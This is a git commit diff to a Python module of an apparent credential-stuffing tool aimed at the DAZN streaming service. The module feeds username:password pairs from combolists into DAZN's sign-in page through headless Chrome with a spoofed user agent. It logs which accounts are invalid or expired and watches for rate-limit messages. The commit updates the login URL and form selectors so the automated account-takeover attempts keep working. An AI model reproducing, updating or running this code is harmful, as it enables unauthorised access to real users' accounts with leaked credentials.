7b8b38c519f05f403f5b54c9f99c7073690eb1bb
g3th <theinkandpen@yahoo.co.uk>
2024-02-15 02:03:27 +0000

    fixed: element fixes, added correct login page added: new class returning latest chrome version to add to headers metadata

--- services/dazn.py
+++ services/dazn.py
@@ -1,6 +1,6 @@
 import time
 import os
-
+from services.chrome_version import GetChromeVersionForCurrentOS
 from combo_splitters.split_combos import ComboSplitter
 from titles.dazn_title import title
 from selenium.common.exceptions import NoSuchElementException, ElementClickInterceptedException
@@ -13,14 +13,14 @@ from pathlib import Path
 
 def dazn():
     title()
-    attempts = 0
+    chrome_version = GetChromeVersionForCurrentOS()
     file_directory = str(Path(__file__).parents[1]) + '/combolists/dazn'
-    page = 'https://www.dazn.com/en-GB/signin'
+    page = 'https://www.dazn.com/signin'
     plain_directory = str(Path(__file__).parents[1])
     error_flag = False
     browser_options = Options()
-    browser_options.add_argument('user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) '
-                                 'Chrome/103.0.5060.134 ''Safari/537.36')
+    browser_options.add_argument('user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
+                                 '(KHTML, like Gecko) Chrome/{} Safari/537.36'.format(chrome_version))
     browser_options.add_experimental_option('excludeSwitches',['enable-logging'])
     browser_options.add_argument('--headless=new')
     splitter = ComboSplitter(file_directory, "dazn")
@@ -38,25 +38,25 @@ def dazn():
                 browser = webdriver.Chrome(options=browser_options)
                 browser.set_window_size(500, 700)
                 browser.get(page)
-                time.sleep(7)
+                time.sleep(8)
 
                 if browser.find_elements(By.XPATH, '//*[@id="onetrust-accept-btn-handler"]'):
                     gdpr_accept_all_button = browser.find_element(By.XPATH, '//*[@id="onetrust-accept-btn-handler"]')
                     gdpr_accept_all_button.click()
-                    time.sleep(5)
+                    time.sleep(8)
 
                 if browser.find_elements(By.XPATH, '//*[@id="root"]/div/div[2]/div/div[4]/div[1]'):
                     print('\nCountry not supported, or blacklisted VPN IP')
                     print('please use a supported location/IP address.\nEnding.\n')
                     exit()
                
-                email_input_box = browser.find_element(By.XPATH, '//*[@id="email"]')
-                password_input_box = browser.find_element(By.XPATH, '//*[@id="password"]')
+                email_input_box = browser.find_element(By.XPATH, '//input[@data-test-id="EMAIL"]')
+                password_input_box = browser.find_element(By.XPATH, '//input[@data-test-id="PASSWORD"]')
                 sign_in_button = browser.find_element(By.XPATH, '//*[@id="root"]/div[1]/main/form/button')
                 email_input_box.send_keys(users[index])
                 password_input_box.send_keys(passwords[index])
                 sign_in_button.click()
-                time.sleep(7)
+                time.sleep(6)
                 if browser.find_elements(By.XPATH, '/html/body/reach-portal/div[3]/div/div/div'):
                     four_two_nine = browser.find_element(By.XPATH, '/html/body/reach-portal/div[3]/div/div/div').text
                     if 'Too many attempts' in four_two_nine:
@@ -71,10 +71,6 @@ def dazn():
                 if browser.find_elements(By.XPATH, '//*[@id="password_error"]'):
                     print(" | {}:{} ---> Invalid Credentials".format(users[index], passwords[index]))
                     error_flag = True
-
-                if browser.find_elements(By.XPATH, '/html/body/reach-portal/div[3]/div/div/div/div[1]/span'):
-                    print(' | {}:{} ---> Geo-locked login'.format(users[index], passwords[index]))
-                    account_results.write('{}:{} ---> Geo-locked login'.format(users[index], passwords[index]))
 
                 if browser.find_elements(By.XPATH, '//*[@id="root"]/div/div[2]/div/div/div/div[2]/div/span/div'):
                     expired_account_text = browser.find_element(By.XPATH,
